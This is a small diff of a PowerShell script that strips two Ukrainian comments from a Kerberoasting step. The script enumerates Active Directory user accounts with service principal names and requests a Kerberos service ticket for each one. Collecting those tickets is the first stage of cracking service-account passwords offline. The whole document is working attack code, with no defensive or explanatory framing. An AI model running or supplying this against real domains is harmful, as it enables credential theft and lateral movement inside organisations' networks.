@@ -1,10 +1,8 @@
-# Знаходимо всі SPN (Service Principal Names) через ADSI
 $searcher = [adsisearcher]"(&(servicePrincipalName=*)(samAccountType=805306368))"
 $targets = $searcher.FindAll()
 
 foreach ($target in $targets) {
     $spn = $target.Properties.serviceprincipalname[0]
     Write-Host "[+] Requesting: $spn"
-    # Використовуємо вбудований .NET клас для запиту квитка
     $tmp = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
 }
